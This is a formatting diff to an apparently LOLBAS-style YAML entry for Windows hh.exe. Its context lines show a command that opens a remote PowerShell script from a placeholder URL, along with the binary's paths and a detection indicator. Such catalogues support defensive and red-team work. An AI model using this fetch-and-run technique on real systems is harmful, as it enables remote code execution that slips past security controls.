@@ -2,7 +2,7 @@
 Name: Hh.exe
 Description: Binary used for processing chm files in Windows
 Author: 'Oddvar Moe'
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: HH.exe http://some.url/script.ps1
     Description: Open the target PowerShell script with HTML Help.
@@ -23,7 +23,7 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\hh.exe
   - Path: C:\Windows\SysWOW64\hh.exe
-Code_Sample: 
+Code_Sample:
 - Code:
 Detection:
  - IOC: hh.exe should normally not be in use on a normal workstation
